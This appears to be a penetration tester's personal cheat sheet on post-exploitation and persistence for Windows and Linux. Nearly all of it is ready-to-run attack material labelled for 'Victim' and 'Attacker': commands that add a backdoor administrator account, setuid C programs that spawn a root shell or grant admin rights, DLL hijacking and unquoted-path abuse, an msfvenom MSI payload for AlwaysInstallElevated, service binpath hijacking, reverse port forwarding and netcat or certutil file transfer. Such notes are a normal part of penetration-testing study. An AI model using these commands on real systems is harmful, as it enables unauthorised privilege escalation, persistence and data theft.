---
title: Maintaining Access
tags: [Penetration Testing]
---
> ℹ️ Ensuring you don’t have to re-exploit over and over again

# Executing in Memory - TMPFS

```bash
mount | grep ^tmp

# Example:
# tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
#
# Beware of the "noexec" flag; executing programs will fail
```

# Get full TTY shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

# Switch user

```bash
su $USER
```

# Run Single command as a different user

## Linux

```bash
sudo -u $USER $cmd
```

## Windows

```bash
echo "$PASSWORD" | runas /profile /user:$USER “$COMMAND”
```

[sudo.cmd](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bca8b383-1786-4430-8e01-ac5cfbd5b320/sudo.cmd)

[sudo.cmd [Copy & Paste]](https://www.notion.so/sudo-cmd-Copy-Paste-524a82cc6884437abaddce9999713dfc)

# Windows Privilege Escalation

## [windows-exploit-suggester.py](http://windows-exploit-suggester.py)

[AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

[windows-exploit-suggester.py](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa740c70-397e-4ee7-b4d8-aaf6c17766cd/windows-exploit-suggester.py)

```
# Victim
systeminfo # Copy & Paste this into a file on the attacker

# Attacker
python windows-exploit-suggester.py --update

python windows-exploit-suggester.py --database 20XX-YY-ZZ-mssb.xlsx --systeminfo systeminfo.txt
```

## Creating Windows Admin Account

```bash
# Victim
net user /add jack sparrow
net localgroup administrators jack /add

# Connect with
rdesktop -u jack -p sparrow [IP-ADDRESS]
```

## Setuid.c

[setuid.c](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4e1cf5be-b5e2-4d56-a25f-e55b5c7495d0/win_setuid.c)

If you can overwrite a binary that’ll be run with priviledge, run this.

```bash
#include <stdlib.h>
int main()
{
    int i;
    i = system("net localgroup administrators theusername /add");
    return 0;
}
```

## Using Windows Internals

[sagishahar/scripts](https://github.com/sagishahar/scripts/blob/master/windows_dll.c)

[windows_dll.c](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0d66ed1f-2880-4833-91d9-eb89d1855e3b/windows_dll.c)

[sagishahar/scripts](https://github.com/sagishahar/scripts/blob/master/windows_service.c)

[windows_service.c](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/074af130-f122-4c8f-af89-aa469b1b5ed9/windows_service.c)

[](https://download.sysinternals.com/files/ProcessMonitor.zip)

[procmon.exe.bak](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b6786799-9d45-47cb-b6f4-e5e64f369f40/procmon.exe.bak)

-   _DLL Hijacking w/ Procmon.exe Requires GUI (so RDP…)_
-   Run the following; look for services that call DLLs that return “NAME NOT FOUND”. You can add a DLL to these locations and it will be loaded in, in the context of the process (potentially as SYSTEM)

```bash
# Victim - Run as Administrator (yes, I know...)
procmon.exe
```

To exploit, use the `windows_dll.c` templated and compile with the following.

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o [dll_name].dll
```

## Cross-compiling for Windows

### C & C++

```bash
# Setup
apt install mingw-w64

# x86
x86_64-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
```

### C#

```bash
# Setup 
# Add repo with <https://www.mono-project.com/download/stable/>
sudo apt-get install mono-complete msbuild mono-roslyn

# Building
msbuild [src.sln]
```

### Using Python Scripts without Python installed

[pyinstaller/pyinstaller](https://github.com/pyinstaller/pyinstaller)

[PyInstaller-3.6.zip](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0038bb61-6902-4698-81a2-7cfdaa0c8354/PyInstaller-3.6.zip)

```bash
pyinstaller yourprogram.py
```

### Startup Application

If you can run programs at startup, the next time someone logs in; you could get a shell before they know what’s happening. Run the following and look for `BUILTIN\\Users` if they have `(F)` or `(C)` it is vulnerable.

```bash
icacls.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
```

Simply put an exe in here to have it execute on startup.

### Always Install Elevated

```bash
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer

# If both of these are 0x1 - you can install msi packages as system.
# Generate MSI Payload with:
msfvenom [blah blah blah] -f msi -o setup.msi

# Execute it with:
msiexec /quiet /qn /i setup.msi
```

### Unquoted Paths

When windows sees the a service is pointed to `C:\\Program Files\\Something Here\\service.exe` (**without quotes around it**), it will try to run the following in order:

```bash
C:\\Program.exe
C:\\Program Files\\Something.exe
C:\\Program Files\\Something Here\\service.exe
```

If you make sure one of these exists before the legitimate is called, you can get code execution.

### Attacking From The Inside

Some services can only be accessed from inside the victim itself. List all active network connections with:

```bash
netstat -ano
```

Then port forward to them using reverse ssh proxy.

**_Putty_**

[Download PuTTY: latest release (0.74)](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

**Plink**

[](https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe)

[plink.exe.bak](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/631dcba9-8676-4da2-aaf1-0162e6f7fce6/plink.exe.bak)

```
plink.exe -l $LUSER -pw $LPASS $LHOST -R $LPORT:127.0.0.1:$RPORT
# L == Attacker
# R == Victim
```

### Vulnerable Scheduled Tasks

```bash
# Victim
schtasks /query /fo LIST /v > schtask.txt

# Attacker
cat schtask.txt | grep "SYSTEM\\|Task To Run" | grep -B 1 SYSTEM
```

### Weak Service Permissions

Thanks to `sushant747` for the following scripts.

### Using WMCI

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\\windows\\temp\\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls "%a"
```

### sc.exe

```bash
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

Then go through it manually with:

```bash
cacls "C:\\path\\to\\file.exe"
```

### Get Info on all Services

```bash
sc query state= all | findstr "SERVICE_NAME:" >> tmp_servicenames.txt

FOR /F "tokens=2 delims= " %i in (tmp_servicenames.txt) DO @echo %i >> tmp_services.txt

FOR /F %i in (tmp_services.txt) DO @sc qc %i >> service_report.txt

del tmp_servicenames.txt && del tmp_services.txt
```

### Restarting a Service

```bash
wmic service [service name] call startservice

# OR

net stop [service name] && net start [service name].
```

### AccessChk

[](https://download.sysinternals.com/files/AccessChk.zip)

[accesschk_v5.02.exe.bak](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/098e483a-5c5c-4518-bcfe-77ab1af181b9/accesschk_v5.02.exe.bak)

```bash
# Accesschk stuff
accesschk.exe /accepteula #(always do this first!!!!!)
accesschk.exe -ucqv [service_name] #(requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" *  # (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\\
accesschk.exe -uwdqs "Authenticated Users" c:\\

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\\*.*
accesschk.exe -uwqs "Authenticated Users" c:\\*.*

# Check permissions on spesific folder
accesschk.exe -wvu "C:\\Path\\To\\Folder" # Look for “FILE_ALL_ACCESS”
```

Check if you can change a service’s binpath

```bash
# Detect
accesschk.exe -wuvc [service_name] # Look for “SERVICE_CHANGE_CONFIG”

# Exploit
sc config [service_name] binpath= "[cmd]"
```

---

## Linux Privilege Escalation

### Setuid.c

[lin_setuid.c](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e34438fd-f501-4f64-a291-714f9e4f36e3/lin_setuid.c)

If you can overwrite a binary that’ll be run with priviledge, run this.

```bash
int main(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", 0);
}
```

# Exfiltration

-   SSH Copy (scp)

```bash
scp user@hostname:/path/to/src user@hostname:/path/to/dst
```

-   Netcat

```bash
# Victim
nc -nvlp $RPORT > out.file

# Attacker
nc -nv $RHOST $RPORT < in.file
```

-   exe2bat

```bash
# Convert a windows executable to a copy and paste set of commands
wine $(locate exe2bat.exe) nc.exe nc.txt
```

-   certutil.exe

```bash
certutil.exe -urlcache -split -f "$URL" $FILENAME
```

-   zip.vbs

[zip.vbs](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cbbb1ade-c651-43f3-afd5-dbda3ee227f8/zip.vbs)

[zip.vbs [Copy & Paste]](https://www.notion.so/zip-vbs-Copy-Paste-6157fb8aacf9407b824d7fae2f6078b7)

```bash
CScript zip.vbs $SRC $DEST
```

-   wget.vbs

[wget.vbs](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/458833a0-ba27-483a-a972-58d8afe59e88/wget.vbs)

[wget.vbs [Copy & Paste]](https://www.notion.so/wget-vbs-Copy-Paste-dc460fecb63c4addae05f00ee30a2fad)

```bash
CScript wget.vbs $SRC $DEST
```

# Fun Tricks

## Linux Write a file without a text editor

```bash
cat <<EOF> [file]
```